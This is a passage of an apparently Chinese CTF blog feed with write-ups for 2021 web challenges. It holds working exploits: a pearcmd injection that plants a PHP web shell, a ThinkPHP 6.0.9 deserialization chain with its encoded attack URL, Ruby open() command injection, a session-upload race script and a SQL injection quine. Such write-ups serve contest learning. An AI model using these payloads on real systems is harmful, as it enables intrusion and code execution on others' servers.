<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?+config-create+/&amp;m=index&amp;a=getshtml&amp;surl=Li4vLi4vLi4vLi4vdXNyL2xvY2FsL2xpYi9waHAvcGVhcmNtZA==&amp;/&lt;?=system($_POST[0])?&gt;+/tmp/a.php</span><br></pre></td></tr></table></figure>

<p>然后再去包含生成的a.php就可以rce</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php?m=index&amp;a=getshtml&amp;surl=Li4vLi4vLi4vLi4vdXNyL2xvY2FsL2xpYi9waHAvcGVhcmNtZA==</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">POST</span><br><span class="line">0=system(&#x27;/readflag&#x27;);</span><br></pre></td></tr></table></figure>

<h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><p>给了源码，过滤的比较死，平常的绕过都不行，然后发现使用了latte这个模板，去拉了一个下来，发现他会在tempdir目录下生成一个php文件，文件名是又版本号去控制的然后本地起了后改版本号去试靶机上的php文件名，发现是用的2.10.4</p>
<p><img src="/2021/11/30/2021%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91wp/2021%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91wp/image-20211120214405137.png" alt="image-20211120214405137"></p>
<p><img src="/2021/11/30/2021%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91wp/2021%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91wp/image-20211120214516000.png" alt="image-20211120214516000"></p>
<p><img src="/2021/11/30/2021%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91wp/2021%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91wp/image-20211120214754551.png" alt="image-20211120214754551"></p>
<p>那么接下来就直接上传.user.ini去包含/flag就可以了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auto_prepend_file=&quot;/flag&quot;</span><br></pre></td></tr></table></figure>



<h3 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h3><p>这就是个信息泄露，直接扫目录，可以发现有/.idea/dataSources.xml里面直接有flag</p>
<h3 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h3><p>这是个tp6.0.9 先直接去读控制器的源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/public/?file=Index.php</span><br></pre></td></tr></table></figure>

<p>然后发现有个反序列化点，先要绕一下前面的parse_url</p>
<p>用///可以使parse_url返回false</p>
<p>这样就绕过了正则，然后随便找条链子直接打</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>&#123;</span><br><span class="line">    <span class="title">trait</span> <span class="title">Attribute</span>&#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">data</span> = [7];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">view</span>\<span class="title">driver</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Php</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> <span class="title">think</span>&#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Model</span>&#123;</span><br><span class="line">        <span class="title">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$lazySave</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$withEvent</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$table</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;lazySave = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;withEvent = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;table = <span class="keyword">new</span> route\Url(<span class="keyword">new</span> Middleware,<span class="keyword">new</span> Validate,<span class="variable">$cmd</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Middleware</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$request</span> = <span class="number">2333</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Validate</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$type</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">             <span class="keyword">$this</span>-&gt;type = [</span><br><span class="line">                <span class="string">&quot;getDomainBind&quot;</span> =&gt; [<span class="keyword">new</span> view\driver\Php,<span class="string">&#x27;display&#x27;</span>]</span><br><span class="line">            ];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;&#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">route</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Url</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">url</span> = &#x27;<span class="title">a</span>:&#x27;;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$domain</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$app</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$route</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$app</span>,<span class="variable">$route</span>,<span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;domain = <span class="variable">$cmd</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;app = <span class="variable">$app</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;route = <span class="variable">$route</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">urlencode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">think</span>\<span class="title">Model</span>\<span class="title">Pivot</span>(&#x27;&lt;?<span class="title">php</span> <span class="title">system</span>(&quot;<span class="title">cat</span> /<span class="title">flag</span>&quot;); <span class="keyword">exit</span>(); <span class="meta">?&gt;</span><span class="string">&#x27;)));</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://e20e2f9f-b46f-4eed-9e99-7fc4519907bd.easytp-ctf.dasctf.com:2333///public/index.php/index/unser?vulvul=O%3A17%3A%22think%5Cmodel%5CPivot%22%3A4%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3Bs%3A8%3A%22%00%2A%00table%22%3BO%3A15%3A%22think%5Croute%5CUrl%22%3A4%3A%7Bs%3A6%3A%22%00%2A%00url%22%3Bs%3A2%3A%22a%3A%22%3Bs%3A9%3A%22%00%2A%00domain%22%3Bs%3A37%3A%22%3C%3Fphp+system%28%22cat+%2Fflag%22%29%3B+exit%28%29%3B+%3F%3E%22%3Bs%3A6%3A%22%00%2A%00app%22%3BO%3A16%3A%22think%5CMiddleware%22%3A1%3A%7Bs%3A7%3A%22request%22%3Bi%3A2333%3B%7Ds%3A8%3A%22%00%2A%00route%22%3BO%3A14%3A%22think%5CValidate%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00type%22%3Ba%3A1%3A%7Bs%3A13%3A%22getDomainBind%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A21%3A%22think%5Cview%5Cdriver%5CPhp%22%3A0%3A%7B%7Di%3A1%3Bs%3A7%3A%22display%22%3B%7D%7D%7D%7Ds%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bi%3A0%3Bi%3A7%3B%7D%7D</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>比赛WP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
        <tag>Web</tag>
        <tag>Sec</tag>
      </tags>
  </entry>
  <entry>
    <title>第三届第五空间初赛 Web</title>
    <url>/2021/09/17/%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4wp/%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4/</url>
    <content><![CDATA[<p><em><strong>第一次和队友一起 ak web，这次题目总体来说不是很难，有不过几个题目确实很考验人</strong></em></p>
<span id="more"></span>

<h3 id="PNG图片转换器"><a href="#PNG图片转换器" class="headerlink" title="PNG图片转换器"></a>PNG图片转换器</h3><p>源码</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;digest&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;base64&#x27;</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  open(<span class="string">&quot;./view/index.html&quot;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/upload&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  open(<span class="string">&quot;./view/upload.html&quot;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">&#x27;/upload&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">unless</span> params[<span class="symbol">:file</span>] &amp;&amp; params[<span class="symbol">:file</span>][<span class="symbol">:tempfile</span>] &amp;&amp; params[<span class="symbol">:file</span>][<span class="symbol">:filename</span>] &amp;&amp; params[<span class="symbol">:file</span>][<span class="symbol">:filename</span>].split(<span class="string">&#x27;.&#x27;</span>)[-<span class="number">1</span>] == <span class="string">&#x27;png&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;error&#x27;);location.href=&#x27;/upload&#x27;;&lt;/script&gt;&quot;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">begin</span></span><br><span class="line">    filename = Digest::MD5.hexdigest(Time.now.to_i.to_s + params[<span class="symbol">:file</span>][<span class="symbol">:filename</span>]) + <span class="string">&#x27;.png&#x27;</span></span><br><span class="line">    open(filename, <span class="string">&#x27;wb&#x27;</span>) &#123; <span class="params">|f|</span></span><br><span class="line">      f.write open(params[<span class="symbol">:file</span>][<span class="symbol">:tempfile</span>],<span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="string">&quot;Upload success, file stored at <span class="subst">#&#123;filename&#125;</span>&quot;</span></span><br><span class="line">  <span class="keyword">rescue</span></span><br><span class="line">    <span class="string">&#x27;something wrong&#x27;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/convert&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  open(<span class="string">&quot;./view/convert.html&quot;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">&#x27;/convert&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">begin</span></span><br><span class="line">    <span class="keyword">unless</span> params[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;error&#x27;);location.href=&#x27;/convert&#x27;;&lt;/script&gt;&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    file = params[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">unless</span> file.index(<span class="string">&#x27;..&#x27;</span>) == <span class="literal">nil</span> &amp;&amp; file.index(<span class="string">&#x27;/&#x27;</span>) == <span class="literal">nil</span> &amp;&amp; file =~ <span class="regexp">/^(.+)\.png$/</span></span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;dont hack me&#x27;);&lt;/script&gt;&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    res = open(file, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">    headers <span class="string">&#x27;Content-Type&#x27;</span> =&gt; <span class="string">&quot;text/html; charset=utf-8&quot;</span></span><br><span class="line">    <span class="string">&quot;var img = document.createElement(\&quot;img\&quot;);\nimg.src= \&quot;data:image/png;base64,&quot;</span> + Base64.encode64(res).gsub(<span class="regexp">/\s*/</span>, <span class="string">&#x27;&#x27;</span>) + <span class="string">&quot;\&quot;;\n&quot;</span></span><br><span class="line">  <span class="keyword">rescue</span></span><br><span class="line">    <span class="string">&#x27;something wrong&#x27;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>open函数可以命令执行</p>
<p>exp：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">|<span class="built_in">echo</span> <span class="string">&quot;bHMgLw==&quot;</span> &gt; 5aa3c130912c7c2b0268a576ba514ad2.png</span><br><span class="line">|`base64 -d 5aa3c130912c7c2b0268a576ba514ad2.png`&gt;5aa3c130912c7c2b0268a576ba514ad2.png</span><br><span class="line">5aa3c130912c7c2b0268a576ba514ad2.png</span><br><span class="line">|<span class="built_in">echo</span> <span class="string">&quot;Y2F0IC9GTEE5X1B3bW1YNkxEZURuRUxqZzE3R2xS&quot;</span> &gt; 5aa3c130912c7c2b0268a576ba514ad2.png</span><br><span class="line">|`base64 -d 5aa3c130912c7c2b0268a576ba514ad2.png`&gt;5aa3c130912c7c2b0268a576ba514ad2.png</span><br><span class="line">5aa3c130912c7c2b0268a576ba514ad2.png</span><br></pre></td></tr></table></figure>

<h3 id="EasyCleanup"><a href="#EasyCleanup" class="headerlink" title="EasyCleanup"></a>EasyCleanup</h3><p>源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>] == <span class="string">&quot;eval&quot;</span>)&#123;</span><br><span class="line">    <span class="variable">$shell</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>] ?? <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$shell</span>) &gt; <span class="number">15</span> | filter(<span class="variable">$shell</span>) | checkNums(<span class="variable">$shell</span>)) <span class="keyword">exit</span>(<span class="string">&quot;hacker&quot;</span>);</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$shell</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &gt; <span class="number">15</span> | filter(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) <span class="keyword">exit</span>(<span class="string">&quot;hacker&quot;</span>);</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$var</span></span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">    <span class="variable">$banned</span> = [<span class="string">&quot;while&quot;</span>, <span class="string">&quot;for&quot;</span>, <span class="string">&quot;\$_&quot;</span>, <span class="string">&quot;include&quot;</span>, <span class="string">&quot;env&quot;</span>, <span class="string">&quot;require&quot;</span>, <span class="string">&quot;?&quot;</span>, <span class="string">&quot;:&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;+&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;`&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$banned</span> <span class="keyword">as</span> <span class="variable">$ban</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(strstr(<span class="variable">$var</span>, <span class="variable">$ban</span>)) <span class="keyword">return</span> <span class="literal">True</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkNums</span>(<span class="params"><span class="variable">$var</span></span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">    <span class="variable">$alphanum</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>;</span><br><span class="line">    <span class="variable">$cnt</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$alphanum</span>); <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; strlen(<span class="variable">$var</span>); <span class="variable">$j</span>++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$var</span>[<span class="variable">$j</span>] == <span class="variable">$alphanum</span>[<span class="variable">$i</span>])&#123;</span><br><span class="line">                <span class="variable">$cnt</span> += <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$cnt</span> &gt; <span class="number">8</span>) <span class="keyword">return</span> <span class="literal">True</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>



<p>session文件包含一把梭</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://114.115.134.72:32770/&quot;</span></span><br><span class="line">PHPSESSID = <span class="string">&quot;2333&quot;</span></span><br><span class="line">PHP_SESSION_UPLOAD_PROGRESS = <span class="string">&quot;&lt;?php system(&#x27;cat /flag_is_here_not_are_but_you_find&#x27;);?&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&quot;a&quot;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        session.post(url=url, data=&#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: PHP_SESSION_UPLOAD_PROGRESS&#125;,</span><br><span class="line">                     files=&#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&quot;233.txt&quot;</span>, f)&#125;, cookies=&#123;<span class="string">&quot;PHPSESSID&quot;</span>: PHPSESSID&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        rsp = session.get(</span><br><span class="line">            url=<span class="string">f&quot;http://114.115.134.72:32770/?file=/tmp/sess_<span class="subst">&#123;PHPSESSID&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;upload_progress&quot;</span> <span class="keyword">in</span> rsp.text:</span><br><span class="line">            <span class="built_in">print</span>(rsp.text)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">    t1 = threading.Thread(target=write, args=(session,))</span><br><span class="line">    t1.daemon = <span class="literal">True</span></span><br><span class="line">    t1.start()</span><br><span class="line"></span><br><span class="line">    exploit(session)</span><br></pre></td></tr></table></figure>

<p><img src="/2021/09/17/%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4wp/%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4/3694939133.png"></p>
<h3 id="yet-another-mysql-injection"><a href="#yet-another-mysql-injection" class="headerlink" title="yet_another_mysql_injection"></a>yet_another_mysql_injection</h3><p>源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;lib.php&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">alertMes</span>(<span class="params"><span class="variable">$mes</span>,<span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;<span class="subst">&#123;$mes&#125;</span>&#x27;);location.href=&#x27;<span class="subst">&#123;$url&#125;</span>&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSql</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/regexp|between|in|flag|=|&gt;|&lt;|and|\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\$|0x|sleep|\ /i&quot;</span>,<span class="variable">$s</span>))&#123;</span><br><span class="line">        alertMes(<span class="string">&#x27;hacker&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] != <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$username</span> !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        alertMes(<span class="string">&#x27;only admin can login&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    checkSql(<span class="variable">$password</span>);</span><br><span class="line">    <span class="variable">$sql</span>=<span class="string">&quot;SELECT password FROM users WHERE username=&#x27;admin&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$user_result</span>=mysqli_query(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = mysqli_fetch_array(<span class="variable">$user_result</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$row</span>) &#123;</span><br><span class="line">        alertMes(<span class="string">&quot;something wrong&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] === <span class="variable">$password</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$FLAG</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    alertMes(<span class="string">&quot;wrong password&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>payload：</p>
<p><code>&#39;union/**/select/**/replace(replace(&#39;&quot;union/**/select/**/replace(replace(&quot;X&quot;,char(34),char(39)),char(88),&quot;X&quot;)#&#39;,char(34),char(39)),char(88),&#39;&quot;union/**/select/**/replace(replace(&quot;X&quot;,char(34),char(39)),char(88),&quot;X&quot;)#&#39;)#</code></p>
<h3 id="WebFTP"><a href="#WebFTP" class="headerlink" title="WebFTP"></a>WebFTP</h3><p>本地起了个环境，发现可以泄露出密码直接登录写shell</p>
<p><img src="/2021/09/17/%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4wp/%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4/59208566.png"></p>
<p><img src="/2021/09/17/%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4wp/%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4/418859014.png"></p>
<h3 id="pklovecloud"><a href="#pklovecloud" class="headerlink" title="pklovecloud"></a>pklovecloud</h3><p>源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pkshow</span> </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">echo_name</span>(<span class="params"></span>)     </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Pk very safe^.^&quot;</span>;      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">acp</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$cinder</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$neutron</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nova</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123;      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;cinder = <span class="keyword">new</span> pkshow;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;cinder))  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;cinder-&gt;echo_name();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ace</span></span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;     </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$openstack</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$docker</span>; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">echo_name</span>(<span class="params"></span>)      </span></span><br><span class="line"><span class="function">    